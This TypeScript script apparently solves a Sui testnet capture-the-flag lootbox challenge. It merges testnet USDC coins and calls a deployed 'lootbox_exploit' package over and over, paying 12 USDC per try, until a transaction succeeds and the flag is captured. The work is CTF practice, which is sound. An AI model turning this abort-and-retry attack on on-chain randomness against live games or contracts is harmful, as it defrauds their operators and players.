import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const EXPLOIT_PACKAGE = '0x6628a60cc50cddb908377aefc9a36ce53a805fb1d1d8b956e9e36b9099350e22';
const USDC_TYPE = '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const RANDOM = '0x8';
const REQUIRED_PAYMENT = 12_000_000n;
const sender = keypair.getPublicKey().toSuiAddress();

(async () => {
  console.log(`Lootbox exploit as ${sender}`);

  const coins = await suiClient.listCoins({ owner: sender, coinType: USDC_TYPE });
  if (coins.objects.length === 0) {
    console.error('No USDC found. Get testnet USDC from https://faucet.circle.com/');
    return;
  }

  const totalUsdc = coins.objects.reduce((sum, c) => sum + BigInt(c.balance), 0n);
  console.log(`USDC balance: ${totalUsdc} (${Number(totalUsdc) / 1e6} USDC)`);
  const maxAttempts = Number(totalUsdc / REQUIRED_PAYMENT);
  console.log(`Can attempt ${maxAttempts} times (25% chance each, need 12 USDC per try)`);

  let usdcCoinId = coins.objects[0].objectId;

  if (coins.objects.length > 1) {
    console.log('Merging USDC coins first...');
    const mergeTx = new Transaction();
    const [primary, ...rest] = coins.objects;
    mergeTx.mergeCoins(
      mergeTx.object(primary.objectId),
      rest.map(c => mergeTx.object(c.objectId)),
    );
    const mergeResult = await suiClient.signAndExecuteTransaction({
      transaction: mergeTx,
      signer: keypair,
      include: { effects: true },
    });
    if (mergeResult.$kind === 'FailedTransaction') {
      console.error('Merge failed');
      return;
    }
    console.log('Coins merged.');
    const updatedCoins = await suiClient.listCoins({ owner: sender, coinType: USDC_TYPE });
    usdcCoinId = updatedCoins.objects[0].objectId;
  }

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    console.log(`\nAttempt ${attempt}/${maxAttempts}...`);

    const tx = new Transaction();
    const [paymentCoin] = tx.splitCoins(tx.object(usdcCoinId), [tx.pure.u64(REQUIRED_PAYMENT)]);

    tx.moveCall({
      target: `${EXPLOIT_PACKAGE}::lootbox_exploit::try_lootbox`,
      arguments: [paymentCoin, tx.object(RANDOM)],
    });

    try {
      const result = await suiClient.signAndExecuteTransaction({
        transaction: tx,
        signer: keypair,
        include: { effects: true },
      });

      if (result.$kind === 'FailedTransaction') {
        console.log(`No flag (tx aborted). Digest: ${result.FailedTransaction?.digest}`);
        const updatedCoins = await suiClient.listCoins({ owner: sender, coinType: USDC_TYPE });
        if (updatedCoins.objects.length > 0) {
          usdcCoinId = updatedCoins.objects[0].objectId;
        }
      } else {
        console.log(`\nLOOTBOX FLAG CAPTURED! Digest: ${result.Transaction?.digest}`);
        return;
      }
    } catch (e: any) {
      console.log(`Transaction error (likely no flag): ${e.message?.substring(0, 100)}`);
      const updatedCoins = await suiClient.listCoins({ owner: sender, coinType: USDC_TYPE });
      if (updatedCoins.objects.length > 0) {
        usdcCoinId = updatedCoins.objects[0].objectId;
      }
    }
  }

  console.log('\nAll attempts exhausted. Need more USDC.');
})();
